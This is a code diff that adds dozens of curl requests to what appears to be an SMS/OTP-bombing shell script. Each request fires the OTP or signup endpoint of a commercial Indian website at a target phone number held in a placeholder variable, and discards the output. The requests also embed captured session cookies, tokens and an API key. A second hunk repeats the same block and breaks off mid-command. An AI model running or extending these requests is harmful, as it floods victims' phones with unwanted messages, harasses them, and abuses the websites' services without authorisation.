@@ -74,6 +74,166 @@ curl 'https://api.testbook.com/api/v2/otp/send?emailOrMobile=€tor&resend=true'
   -H 'x-tb-client: web,1.2' \
   --data-raw '{}' \
   --compressed > /dev/null 2>&1
+  
+curl 'https://api.tatadigital.com/api/v2/sso/check-phone' \
+  -H 'authority: api.tatadigital.com' \
+  -H 'accept: application/json, text/plain, */*' \
+  -H 'accept-language: en-US,en;q=0.9' \
+  -H 'client_id: CROMA-WEB-APP' \
+  -H 'content-type: application/json' \
+  -H 'cookie: SESSION=NjBhZjZjYTAtMjc1YS00M2YwLTliOTUtODVmNGRkZDQyODhl' \
+  -H 'origin: https://www.croma.com' \
+  -H 'referer: https://www.croma.com/' \
+  -H 'sec-ch-ua: "Microsoft Edge";v="111", "Not(A:Brand";v="8", "Chromium";v="111"' \
+  -H 'sec-ch-ua-mobile: ?0' \
+  -H 'sec-ch-ua-platform: "Windows"' \
+  -H 'sec-fetch-dest: empty' \
+  -H 'sec-fetch-mode: cors' \
+  -H 'sec-fetch-site: cross-site' \
+  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edg/111.0.1661.44' \
+  --data-raw '{"countryCode":"91","sendOtp":true,"phone":"€tor"}' \
+  --compressed > /dev/null 2>&1
+  
+curl 'https://www.skechers.in/on/demandware.store/Sites-skechersin-Site/default/Account-GenerateOTP?rurl=1' \
+  -H 'authority: www.skechers.in' \
+  -H 'accept: application/json, text/javascript, */*; q=0.01' \
+  -H 'accept-language: en-US,en;q=0.9' \
+  -H 'content-type: application/x-www-form-urlencoded; charset=UTF-8' \
+  -H 'cookie: sid=3-fBtiLG6qAgnCn2dbfa16Jc_jgPTnXDfW0; dwanonymous_994727fff0a64d37e3fbc8ef34b995e1=abvfEouUeqQ72gYmQ4f0V7RN96; __cq_dnt=1; dw_dnt=1; dwsid=kpSfv_j1dGQ9Xh-r8wPRRu8voDHVfesHYK9qIoCLBBDmo7RCjnkFA4VAUNV2Iztej8JhIGMn5HKbMSoTizisww==; _sfid_69f9={%22anonymousId%22:%22f97fa810e67eaa9c%22}; _evga_5fd7={%22uuid%22:%22f97fa810e67eaa9c%22}; _gcl_au=1.1.1537150235.1679232084; _gid=GA1.2.61017889.1679232084; _gat_UA-115788897-3=1; _ga_PW30J0KXP2=GS1.1.1679232084.1.0.1679232084.60.0.0; _hsu=hs.1679232084313.0d3dd0d24f; _hscl=; _fbp=fb.1.1679232084706.567973459; _clck=489ws|1|fa1|0; cto_bundle=ulWw5F9ld1ltJTJCbXBjQ1B1TkNBanhvV0RZUW5hVkhBd1NUaEclMkZ6JTJCdFoyJTJGYmQ4N2YxOVl0d3E0S3VsWk93MUFrd0JRWVQyZjgxVkxmdkNnTFpkeEdSWGliV0lQUiUyQnFGZWI2NXZ3b3klMkYlMkJsTVdmVXA1MVB6SlJPTm9xdDZzbndiaU9TZDZlTG9wZSUyRjd1ZnoxMzU1RjlObiUyQkdndVElM0QlM0Q; _ga=GA1.2.16812864.1679232084; _clsk=1g0lvcy|1679232086116|1|1|r.clarity.ms/collect' \
+  -H 'origin: https://www.skechers.in' \
+  -H 'referer: https://www.skechers.in/register/' \
+  -H 'sec-ch-ua: "Microsoft Edge";v="111", "Not(A:Brand";v="8", "Chromium";v="111"' \
+  -H 'sec-ch-ua-mobile: ?0' \
+  -H 'sec-ch-ua-platform: "Windows"' \
+  -H 'sec-fetch-dest: empty' \
+  -H 'sec-fetch-mode: cors' \
+  -H 'sec-fetch-site: same-origin' \
+  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edg/111.0.1661.44' \
+  -H 'x-requested-with: XMLHttpRequest' \
+  --data-raw 'dwfrm_profile_customer_phone=€tor&phoneLogin=true' \
+  --compressed > /dev/null 2>&1
+  
+curl 'https://droom.in/send-onboard-otp' \
+  -H 'authority: droom.in' \
+  -H 'accept: application/json, text/javascript, */*; q=0.01' \
+  -H 'accept-language: en-US,en;q=0.9' \
+  -H 'content-type: application/x-www-form-urlencoded; charset=UTF-8' \
+  -H 'cookie: locale=ZW4tSU4=; utfc=NGUzMDY5RGJHVlU3WlBxUw==; Path=/; __AP_SESSION__=e85751c8-9377-4574-8a9f-f4892ff81621; _gcl_au=1.1.1320272575.1679232395; _gid=GA1.2.355529121.1679232396; __gpi=UID=00000bdc0c1c3efd:T=1679232557:RT=1679232557:S=ALNI_MYLPimWWEz9miR5lkGhwpbgi9aPWw; _pbjs_userid_consent_data=3524755945110770; __qca=P0-581497079-1679232396575; _fbp=fb.1.1679232397084.433852724; __gads=ID=1f2dbc43d28c936a-22d88913dade00ce:T=1679232557:S=ALNI_MbBQp1Ex1J3iatUkV7nDMSLcrTjqA; _cc_id=8c8ab7dd09d41744a7b10dddbe68ae9; panoramaId_expiry=1679318957748; dcc=MA==; _ga_DX476DMQYC=GS1.1.1679232396.1.1.1679232459.0.0.0; _ga=GA1.1.60112228.1679232395; _gt=MjE4Y2ZhZjFlNWEzYTVlMA==; XSRF-TOKEN=eyJpdiI6Im9WWWxHNzNQdDY5TlpkMEdmRjhRZWc9PSIsInZhbHVlIjoiTmsvQ1Y4MWM3S3RZZEhwQTlDMlRaTVNTZksydjNEbjdWSWU4b29IWENkOHhEVzNQYW5xUm5UQWhMT0Fmakp1eEdFdE8xVndQWm1IQ3QwL2tBV2p4RXpucTUyOU1LT2JRYUV4c2tRY25iRmEvV0ZuYUVnb0N3Q3ByLzd4eFpVQjkiLCJtYWMiOiIyNzZmNGQyY2ZhNjYxNTgyMTFhMGMwZGJhOTk0ZmUxYjUwZmQ5MDZhYjUzYjA4MDMzZWFmMjcwY2JiNmFiMmMxIiwidGFnIjoiIn0%3D; laravel8_session=eyJpdiI6Ikt0N0VoZkEvVUdSQWpxT21YbFNRWXc9PSIsInZhbHVlIjoidTFiWjdINDVTS00rMXlLeXpIYkNqR1YraCtDTk10eExaQ001bElMcnlVSk9JSVA2SloxSXdsdGxJeTZ3Q3g2UUhEcUpWSHhMVnVtRE5VOEVXWFM3cW85eG5aSkM2c09RMy8rU1VReTlTRTM5aEdwekdZRlZnb1ZBV1NXRGptSmoiLCJtYWMiOiI3ZTU2Yzc1YmQ0NTQzNTY2MmYyZGNjM2NmNDU0NWY4MzQ1ZGYyODBhZDUwZDMzNjBiY2JiNTI0NTVlYzcxZWZjIiwidGFnIjoiIn0%3D' \
+  -H 'origin: https://droom.in' \
+  -H 'referer: https://droom.in/individual/account-signup' \
+  -H 'sec-ch-ua: "Microsoft Edge";v="111", "Not(A:Brand";v="8", "Chromium";v="111"' \
+  -H 'sec-ch-ua-mobile: ?0' \
+  -H 'sec-ch-ua-platform: "Windows"' \
+  -H 'sec-fetch-dest: empty' \
+  -H 'sec-fetch-mode: cors' \
+  -H 'sec-fetch-site: same-origin' \
+  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edg/111.0.1661.44' \
+  -H 'x-requested-with: XMLHttpRequest' \
+  --data-raw 'mobile_phone=€tor&email=hjhzgzcgd%40gmail.com&captcha_value=q6dqk&channel=' \
+  --compressed > /dev/null 2>&1
+  
+curl 'https://api-apollo.dentalkart.com/graphql' \
+  -H 'authority: api-apollo.dentalkart.com' \
+  -H 'accept: */*' \
+  -H 'accept-language: en-US,en;q=0.9' \
+  -H 'authorization;' \
+  -H 'content-type: application/json' \
+  -H 'cookies: country_id=IN; country=India; currency_code=INR; _gcl_au=1.1.2050323954.1679233791; _gid=GA1.2.268070877.1679233792; _dc_gtm_UA-73902580-1=1; _nv_sess=232384256.1679233952.kSuXhmF0gTG0uNEjMrZDbLdv0xENUFcMHGLxG86Akw66qVv0iI; _nv_uid=232384256.1679233952.7f02b1f8-ee36-4558-b0f4-0a7557ccbf93.1679233952.1679233952.1.0; _nv_utm=232384256.1679233952.1.1.dXRtc3JjPShkaXJlY3QpfHV0bWNjbj0oZGlyZWN0KXx1dG1jbWQ9KG5vbmUpfHV0bWN0cj0obm90IHNldCl8dXRtY2N0PShub3Qgc2V0KXxnY2xpZD0obm90IHNldCk=; _nv_did=232384256.1679233952.10318094170rczzb; _nv_hit=232384256.1679233952.cHZpZXc9MQ==; _ALGOLIA=anonymous-0f5e32fd-d22c-4341-8a73-8932d04f2cba; _fbp=fb.1.1679233792149.514608104; ln_or=eyIxMTUyNjUiOiJkIn0%3D; G_ENABLED_IDPS=google; _pin_unauth=dWlkPVltUmhZVFJqTm1JdE1qazBOaTAwTjJGbExXRTNOR0V0WkRSak9UVTRaR0l5WldZMg; _clck=1y24jie|1|fa1|0; _clsk=1oyr2b8|1679233794260|1|1|r.clarity.ms/collect; _ga=GA1.1.256003816.1679233792; _ga_L8SMBC7ZQ6=GS1.1.1679233802.1.0.1679233806.0.0.0' \
+  -H 'origin: https://www.dentalkart.com' \
+  -H 'platform: web' \
+  -H 'referer: https://www.dentalkart.com/' \
+  -H 'sec-ch-ua: "Microsoft Edge";v="111", "Not(A:Brand";v="8", "Chromium";v="111"' \
+  -H 'sec-ch-ua-mobile: ?0' \
+  -H 'sec-ch-ua-platform: "Windows"' \
+  -H 'sec-fetch-dest: empty' \
+  -H 'sec-fetch-mode: cors' \
+  -H 'sec-fetch-site: same-site' \
+  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edg/111.0.1661.44' \
+  -H 'x-api-key: da2-b7vqajjrfbgbvjf4fbesbavuhq' \
+  --data-raw '{"operationName":"createAccountOTP","variables":{"mobileNumber":"€tor","websiteId":1},"query":"mutation createAccountOTP($mobileNumber: String, $websiteId: Int) {\n  createAccountOTP(mobileNumber: $mobileNumber, websiteId: $websiteId) {\n    status\n    message\n    __typename\n  }\n}\n"}' \
+  --compressed > /dev/null 2>&1
+
+curl 'https://www.medplusmart.com/my-profile/getOtp?MOBILE_NUMBER=€tor&tokenId=804936CDD427D57A68744267199F8390&customerId=&timeStapm=2023-03-19T13:52:01.151Z' \
+  -H 'authority: www.medplusmart.com' \
+  -H 'accept: application/json, text/plain, */*' \
+  -H 'accept-language: en-US,en;q=0.9' \
+  -H 'cookie: ROUTEID=.jvm2; bm_sz=57CEC10489D5F07DF940EBCD8C617792~YAAQXW/ZF2i9Pb+GAQAAn1gm+hM6TTycNeo2IYluzrQQk9KVZAvebhbyMiTt2cQZMHQjAYiPh/0yx51aslT3oA323nGZkuayuREcR9Hws3QUD4369JpIYi21yCR1ZLo47HPkp3QmJ3IHL6CRBOIYQvdTlkRmcdPspT3UNrtSQMvD3zV6X4NXb6vPcPDoy/hmOlQYfVnXvhs6drMXxWDPp68B3WBgbie/aAxnfHI59PsTW5/LJbOubLJniP9upLabJWhEZCh4LTWyyMqnWwE6y5NoaoZ6R6KrvnRTEMt6CjgwJujElnZYgg==~4403768~4339249; bm_mi=6E38E55903BCC128AFC98528629CDDE4~YAAQXW/ZF269Pb+GAQAARVom+hO1x/fLeNUXb5pM6udVKl9+c4fEwekTz/5+Z8AyrBP+erhM0jLCUBeEPFgFLiJENLAls/C4/gh/a8y6JOr1kAJoaKRyWYXr5cR/hMLt0lqqjHzepQHm3eQfWcfbZD2YdVm5EoWmkhVyWnQSdo3V+3aciW/Y4neon/LFtnulXjqeJZZbGplo9DsD4CmYhNbfmXci/y6vMQAc9bI3ey8Aof9PyWxQ1MyCH1XF2alEoR+gnmF8W4PgqTJxBO7ocZmoNl43LiqCXNw9PBjCG+ByMEyVVDN/x9oSI8ry7lf3UppaXyrM6z1wpd4fcQ==~1; JSESSIONID=BF9DD7A69E6FF04758EA41ED55CEC84F; tokenId=804936CDD427D57A68744267199F8390; latLong="17.472083, 78.428701"; pincode=500018; b_token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiItMSIsImlzcyI6Ind3dy5tZWRwbHVzbWFydC5jb20iLCJleHAiOjE2NzkzMjA0Njh9.kp1tv-hD0fQWiS5g3iirPiM86oBd2Y-ftAS49zVKJy0; isLocalityMatured=Y; customerId=; ak_bmsc=D43C44A646BFCC9042CE950EDA6BB947~000000000000000000000000000000~YAAQXW/ZF5K9Pb+GAQAA3G4m+hNYKrNf4zY9ABJMwx45sczLxQgLo+ljoIcKZmwTU9aJcVp28VjWfiwwFdGtajPxYM1xbp74d7cxagJeaeNmGXX3TA6bmdlpYJskKd/o5TEa9kBshUpV/aDjsQg/sv3BtUm4UAE6ZAOEH1MKeUhYEBLov+lLH0FGa3cgjVsaEjGnDMu4EUa4feVxViIrYXosf9U/Y18dvKCTxoeH56YUvIlV/PltKRp3L0nsYUzQU7Uy17HTnU18Jzgvyct7jCFW8qQC/TaMffpgwvcH6YUp1TDAkcMwXxoJ4K+bYJWhlcbPl4JS/4w/qCtYN8zfNSbF31Zvi6jPuh+yxMIl/ywA4u7M2MQ9SEJQfEniJYg0GEB2ndXzNaR6QhL8fPTwNotiNW55FMdCXssZTUhAdMsXJzgXqMhTK4D4z90=; _gcl_au=1.1.1324041836.1679233908; bm_sv=233BC1E37EE60BF29EEE0B28B10CE90E~YAAQXW/ZF5a9Pb+GAQAAMnAm+hMh/37sY3LuRgfhfFRevraPN4l2YgI7DVKfsDbB7v7VRHOmFXOVcz/Y4q1IbfAAw2kTDGFfV8A+4IoeMyGMmrh0zOa0tyybnhrsjv6SPKqWuxHJIpjrDYagWX6/y4gZiesJnc7ogPMRubSn/SY3fPR3l9qImFS98e8HfFrHf7UzPhgRQG739jBCYqclR5opcLAtxu7Yv5tjA5X+gCiJ/rjdzKtS+qBBZmVPNzkzf6G6CUU=~1; _fbp=fb.1.1679233908251.327441531; _abck=5F76CF00257596748571D8F6CED4A71F~0~YAAQXW/ZF529Pb+GAQAAzHEm+gnXTre+m74Pv+bapmm0SzSKvV4Ji7o6G800G23rOjGx9pST1oYBvb+8p7jI15lUztzg22YMTKvYdSUxmqks9jQsHqVU/vQPTheeCJQsyGh+wx7N9ykJ1sGyMR/0eSXlacnhFlDCZVK1IhE3DudeZkOdX8HaSK47rE/+Ku3hkC7DlkQCfZV0BM433FpOPTpERxLfgLMLQ1iWhdZ739AMGVU1Z5gPMxx5+BEx1knmoQqpGO2gZEm3nVJKnnsvCbdo3GEGElOi/zl6+dZ1RfpRWDlxPpCnU8eAo1nlWfpI3K1GChN9bq8e+4WHwA7flO0WfEvLrwROt8QeTCfUUblSkxRCNbhsrDVlCWzi2pGncvRQnJDK5tcgietLoHC4zTYlZq1whcB9u19/Dm0e~-1~||-1||~-1; _clck=wam2q|1|fa1|0; _clsk=zsgkpg|1679233909166|1|1|r.clarity.ms/collect' \
+  -H 'referer: https://www.medplusmart.com/signInPopUp' \
+  -H 'sec-ch-ua: "Microsoft Edge";v="111", "Not(A:Brand";v="8", "Chromium";v="111"' \
+  -H 'sec-ch-ua-mobile: ?0' \
+  -H 'sec-ch-ua-platform: "Windows"' \
+  -H 'sec-fetch-dest: empty' \
+  -H 'sec-fetch-mode: cors' \
+  -H 'sec-fetch-site: same-origin' \
+  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edg/111.0.1661.44' \
+  -H 'x-requested-with: XMLHttpRequest' \
+  --compressed > /dev/null 2>&1
+  
+curl 'https://www.lybrate.com/p/login-signup' \
+  -H 'authority: www.lybrate.com' \
+  -H 'accept: application/json, text/plain, */*' \
+  -H 'accept-language: en-US,en;q=0.9' \
+  -H 'content-type: application/json;charset=UTF-8' \
+  -H 'cookie: JSESSIONID=DAAF78EA58DE06B736249DDA358D5FBD; countryCode=IN; latitude=0; longitude=0; suid=8a7631de-cca7-4d1c-87d7-82dba2d4bf7a; est="utm_source=DIRECT|"; _ga=GA1.2.2078038376.1679233966; _gid=GA1.2.1509245264.1679233966; _gat=1; _fbp=fb.1.1679233965937.1538342064; we_luid=cf208a13077826e5d2aa44cf756fd86f31a053f0; AWSALB=fU0zC/AV5v8rl5K6kGh/X2oqLSs+k9ZzSCxW7FDkKvGCMiYNx/syhSe7/Cg5UXxRZncc6uW/Gk6wmKy9pILh6ADX18wSpZDrpCqllh2uvJMXb9SSw6aMDU0xVtS9; AWSALBCORS=fU0zC/AV5v8rl5K6kGh/X2oqLSs+k9ZzSCxW7FDkKvGCMiYNx/syhSe7/Cg5UXxRZncc6uW/Gk6wmKy9pILh6ADX18wSpZDrpCqllh2uvJMXb9SSw6aMDU0xVtS9' \
+  -H 'origin: https://www.lybrate.com' \
+  -H 'referer: https://www.lybrate.com/signup' \
+  -H 'sec-ch-ua: "Microsoft Edge";v="111", "Not(A:Brand";v="8", "Chromium";v="111"' \
+  -H 'sec-ch-ua-mobile: ?0' \
+  -H 'sec-ch-ua-platform: "Windows"' \
+  -H 'sec-fetch-dest: empty' \
+  -H 'sec-fetch-mode: cors' \
+  -H 'sec-fetch-site: same-origin' \
+  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edg/111.0.1661.44' \
+  --data-raw '{"countryCode":"IN","firstName":"vhjgzz","email":"xvvcsv@gmail.com","mobile":"€tor","password":"123456854213"}' \
+  --compressed > /dev/null 2>&1
+  
+  
+curl 'https://kapeefit.com/public/views/templates/login/otp-verify.php?mobile=€tor' \
+  -H 'sec-ch-ua: "Microsoft Edge";v="111", "Not(A:Brand";v="8", "Chromium";v="111"' \
+  -H 'Accept: text/html, */*; q=0.01' \
+  -H 'Referer: https://kapeefit.com/login' \
+  -H 'X-Requested-With: XMLHttpRequest' \
+  -H 'sec-ch-ua-mobile: ?0' \
+  -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edg/111.0.1661.44' \
+  -H 'sec-ch-ua-platform: "Windows"' \
+  --compressed > /dev/null 2>&1
+
+curl 'https://www.docgenie.in/apis//otp/generateotp.php' \
+  -H 'authority: www.docgenie.in' \
+  -H 'accept: application/json, text/plain, */*' \
+  -H 'accept-language: en-US,en;q=0.9' \
+  -H 'content-type: application/json' \
+  -H 'cookie: _gid=GA1.2.1342440784.1679234169; _gat_gtag_UA_172446656_1=1; _ga_WLL9BP8CB5=GS1.1.1679234169.1.0.1679234169.0.0.0; _gcl_au=1.1.807414040.1679234169; _fbp=fb.1.1679234169920.665095662; _clck=iaqxky|1|fa1|0; _clsk=13osg50|1679234170971|1|1|r.clarity.ms/collect; _ga=GA1.2.895373929.1679234169; _gat_UA-172446656-1=1' \
+  -H 'origin: https://www.docgenie.in' \
+  -H 'referer: https://www.docgenie.in/login' \
+  -H 'sec-ch-ua: "Microsoft Edge";v="111", "Not(A:Brand";v="8", "Chromium";v="111"' \
+  -H 'sec-ch-ua-mobile: ?0' \
+  -H 'sec-ch-ua-platform: "Windows"' \
+  -H 'sec-fetch-dest: empty' \
+  -H 'sec-fetch-mode: cors' \
+  -H 'sec-fetch-site: same-origin' \
+  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edg/111.0.1661.44' \
+  --data-raw '{"phoneno":"€tor","apptype":"WEB","token":"QWERTYMKIUIEDFRTYUTFRTEDFRTYGHYTFREDS123-WWE324567"}' \
+  --compressed > /dev/null 2>&1
+  
+curl 'https://www.decathlon.in/api/login/sendotp' \
+  -H 'authority: www.decathlon.in' \
+  -H 'accept: application/json, text/plain, */*' \
+  -H 'accept-language: en-US,en;q=0.9' \
+  -H 'content-type: application/json' \
+  -H 'cookie: location=location; pincodeTooltip=true; pincode=560002; city=Bengaluru; state=Karnataka; _vwo_uuid_v2=DDFB24C01E44A99589F0EF52449020E4E|3b9c39fa82c32f570707e1119bf8819a; _vis_opt_s=1%7C; _vis_opt_test_cookie=1; _vwo_uuid=DDFB24C01E44A99589F0EF52449020E4E; _vwo_ds=3%241679233777%3A88.71006553%3A%3A; _vwo_uuid_26=DDFB24C01E44A99589F0EF52449020E4E; _vwo_sn=0%3A1%3A%3A%3A1; _vis_opt_exp_26_combi=2; _gcl_au=1.1.1825914368.1679233623; _gid=GA1.2.1280967157.1679233639; _dc_gtm_UA-66814020-1=1; _ga_YSWCQHF8KL=GS1.1.1679233639.1.0.1679233639.0.0.0; _ga=GA1.1.1099894913.1679233639; __ywtfpcvuid=14282370551679233639763; __ywtfpcsuid=1581664881679233639764; _uetsid=91acfce0c65c11edaaaca9083b2d5be7; _uetvid=91ad4ec0c65c11edaea5d544e88dfdc0; _hjSessionUser_966591=eyJpZCI6Ijk5ZTZlNWM2LTJkYzAtNWQ0My1hMGFlLWZkOTI2OTkxNTE0MCIsImNyZWF0ZWQiOjE2NzkyMzM2NDEyMjUsImV4aXN0aW5nIjpmYWxzZX0=; _hjFirstSeen=1; _hjIncludedInSessionSample_966591=0; _hjSession_966591=eyJpZCI6IjIwNTYyY2RjLWQ4ZmEtNDBiNy04Y2UzLWZkNjBmOGEwNWYzNiIsImNyZWF0ZWQiOjE2NzkyMzM2NDEyMzcsImluU2FtcGxlIjpmYWxzZX0=; _hjAbsoluteSessionInProgress=0; _fbp=fb.1.1679233641347.306218317; WZRK_G=d7ab473f9d9e42d4b2490128d0f93516; WZRK_S_865-5WR-695Z=%7B%22p%22%3A1%2C%22s%22%3A1679233840%2C%22t%22%3A1679233680%7D' \
+  -H 'origin: https://www.decathlon.in' \
+  -H 'referer: https://www.decathlon.in/' \
+  -H 'sec-ch-ua: "Microsoft Edge";v="111", "Not(A:Brand";v="8", "Chromium";v="111"' \
+  -H 'sec-ch-ua-mobile: ?0' \
+  -H 'sec-ch-ua-platform: "Windows"' \
+  -H 'sec-fetch-dest: empty' \
+  -H 'sec-fetch-mode: cors' \
+  -H 'sec-fetch-site: same-origin' \
+  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edg/111.0.1661.44' \
+  --data-raw '{"param":"€tor","source":1}' \
+  --compressed > /dev/null 2>&1
+  
 curl 'https://api.tendercuts.in/otp/v2/generate/' \
   -H 'authority: api.tendercuts.in' \
   -H 'accept: application/json' \
@@ -506,6 +666,149 @@ curl 'https://www.jio.com/api/jio-login-service/login/sendOtp' \
   -H 'sec-ch-ua-platform: "Windows"' \
   --data-raw '{"mobileNumber":"€tor","loginFlowType":"MOBILE","alternateNumber":""}' \
   --compressed > /dev/null 2>&1
+  
+curl 'https://api.tatadigital.com/api/v2/sso/check-phone' \
+  -H 'authority: api.tatadigital.com' \
+  -H 'accept: application/json, text/plain, */*' \
+  -H 'accept-language: en-US,en;q=0.9' \
+  -H 'client_id: CROMA-WEB-APP' \
+  -H 'content-type: application/json' \
+  -H 'cookie: SESSION=NjBhZjZjYTAtMjc1YS00M2YwLTliOTUtODVmNGRkZDQyODhl' \
+  -H 'origin: https://www.croma.com' \
+  -H 'referer: https://www.croma.com/' \
+  -H 'sec-ch-ua: "Microsoft Edge";v="111", "Not(A:Brand";v="8", "Chromium";v="111"' \
+  -H 'sec-ch-ua-mobile: ?0' \
+  -H 'sec-ch-ua-platform: "Windows"' \
+  -H 'sec-fetch-dest: empty' \
+  -H 'sec-fetch-mode: cors' \
+  -H 'sec-fetch-site: cross-site' \
+  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edg/111.0.1661.44' \
+  --data-raw '{"countryCode":"91","sendOtp":true,"phone":"€tor"}' \
+  --compressed > /dev/null 2>&1
+  
+curl 'https://www.skechers.in/on/demandware.store/Sites-skechersin-Site/default/Account-GenerateOTP?rurl=1' \
+  -H 'authority: www.skechers.in' \
+  -H 'accept: application/json, text/javascript, */*; q=0.01' \
+  -H 'accept-language: en-US,en;q=0.9' \
+  -H 'content-type: application/x-www-form-urlencoded; charset=UTF-8' \
+  -H 'cookie: sid=3-fBtiLG6qAgnCn2dbfa16Jc_jgPTnXDfW0; dwanonymous_994727fff0a64d37e3fbc8ef34b995e1=abvfEouUeqQ72gYmQ4f0V7RN96; __cq_dnt=1; dw_dnt=1; dwsid=kpSfv_j1dGQ9Xh-r8wPRRu8voDHVfesHYK9qIoCLBBDmo7RCjnkFA4VAUNV2Iztej8JhIGMn5HKbMSoTizisww==; _sfid_69f9={%22anonymousId%22:%22f97fa810e67eaa9c%22}; _evga_5fd7={%22uuid%22:%22f97fa810e67eaa9c%22}; _gcl_au=1.1.1537150235.1679232084; _gid=GA1.2.61017889.1679232084; _gat_UA-115788897-3=1; _ga_PW30J0KXP2=GS1.1.1679232084.1.0.1679232084.60.0.0; _hsu=hs.1679232084313.0d3dd0d24f; _hscl=; _fbp=fb.1.1679232084706.567973459; _clck=489ws|1|fa1|0; cto_bundle=ulWw5F9ld1ltJTJCbXBjQ1B1TkNBanhvV0RZUW5hVkhBd1NUaEclMkZ6JTJCdFoyJTJGYmQ4N2YxOVl0d3E0S3VsWk93MUFrd0JRWVQyZjgxVkxmdkNnTFpkeEdSWGliV0lQUiUyQnFGZWI2NXZ3b3klMkYlMkJsTVdmVXA1MVB6SlJPTm9xdDZzbndiaU9TZDZlTG9wZSUyRjd1ZnoxMzU1RjlObiUyQkdndVElM0QlM0Q; _ga=GA1.2.16812864.1679232084; _clsk=1g0lvcy|1679232086116|1|1|r.clarity.ms/collect' \
+  -H 'origin: https://www.skechers.in' \
+  -H 'referer: https://www.skechers.in/register/' \
+  -H 'sec-ch-ua: "Microsoft Edge";v="111", "Not(A:Brand";v="8", "Chromium";v="111"' \
+  -H 'sec-ch-ua-mobile: ?0' \
+  -H 'sec-ch-ua-platform: "Windows"' \
+  -H 'sec-fetch-dest: empty' \
+  -H 'sec-fetch-mode: cors' \
+  -H 'sec-fetch-site: same-origin' \
+  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edg/111.0.1661.44' \
+  -H 'x-requested-with: XMLHttpRequest' \
+  --data-raw 'dwfrm_profile_customer_phone=€tor&phoneLogin=true' \
+  --compressed > /dev/null 2>&1
+  
+curl 'https://droom.in/send-onboard-otp' \
+  -H 'authority: droom.in' \
+  -H 'accept: application/json, text/javascript, */*; q=0.01' \
+  -H 'accept-language: en-US,en;q=0.9' \
+  -H 'content-type: application/x-www-form-urlencoded; charset=UTF-8' \
+  -H 'cookie: locale=ZW4tSU4=; utfc=NGUzMDY5RGJHVlU3WlBxUw==; Path=/; __AP_SESSION__=e85751c8-9377-4574-8a9f-f4892ff81621; _gcl_au=1.1.1320272575.1679232395; _gid=GA1.2.355529121.1679232396; __gpi=UID=00000bdc0c1c3efd:T=1679232557:RT=1679232557:S=ALNI_MYLPimWWEz9miR5lkGhwpbgi9aPWw; _pbjs_userid_consent_data=3524755945110770; __qca=P0-581497079-1679232396575; _fbp=fb.1.1679232397084.433852724; __gads=ID=1f2dbc43d28c936a-22d88913dade00ce:T=1679232557:S=ALNI_MbBQp1Ex1J3iatUkV7nDMSLcrTjqA; _cc_id=8c8ab7dd09d41744a7b10dddbe68ae9; panoramaId_expiry=1679318957748; dcc=MA==; _ga_DX476DMQYC=GS1.1.1679232396.1.1.1679232459.0.0.0; _ga=GA1.1.60112228.1679232395; _gt=MjE4Y2ZhZjFlNWEzYTVlMA==; XSRF-TOKEN=eyJpdiI6Im9WWWxHNzNQdDY5TlpkMEdmRjhRZWc9PSIsInZhbHVlIjoiTmsvQ1Y4MWM3S3RZZEhwQTlDMlRaTVNTZksydjNEbjdWSWU4b29IWENkOHhEVzNQYW5xUm5UQWhMT0Fmakp1eEdFdE8xVndQWm1IQ3QwL2tBV2p4RXpucTUyOU1LT2JRYUV4c2tRY25iRmEvV0ZuYUVnb0N3Q3ByLzd4eFpVQjkiLCJtYWMiOiIyNzZmNGQyY2ZhNjYxNTgyMTFhMGMwZGJhOTk0ZmUxYjUwZmQ5MDZhYjUzYjA4MDMzZWFmMjcwY2JiNmFiMmMxIiwidGFnIjoiIn0%3D; laravel8_session=eyJpdiI6Ikt0N0VoZkEvVUdSQWpxT21YbFNRWXc9PSIsInZhbHVlIjoidTFiWjdINDVTS00rMXlLeXpIYkNqR1YraCtDTk10eExaQ001bElMcnlVSk9JSVA2SloxSXdsdGxJeTZ3Q3g2UUhEcUpWSHhMVnVtRE5VOEVXWFM3cW85eG5aSkM2c09RMy8rU1VReTlTRTM5aEdwekdZRlZnb1ZBV1NXRGptSmoiLCJtYWMiOiI3ZTU2Yzc1YmQ0NTQzNTY2MmYyZGNjM2NmNDU0NWY4MzQ1ZGYyODBhZDUwZDMzNjBiY2JiNTI0NTVlYzcxZWZjIiwidGFnIjoiIn0%3D' \
+  -H 'origin: https://droom.in' \
+  -H 'referer: https://droom.in/individual/account-signup' \
+  -H 'sec-ch-ua: "Microsoft Edge";v="111", "Not(A:Brand";v="8", "Chromium";v="111"' \
+  -H 'sec-ch-ua-mobile: ?0' \
+  -H 'sec-ch-ua-platform: "Windows"' \
+  -H 'sec-fetch-dest: empty' \
+  -H 'sec-fetch-mode: cors' \
+  -H 'sec-fetch-site: same-origin' \
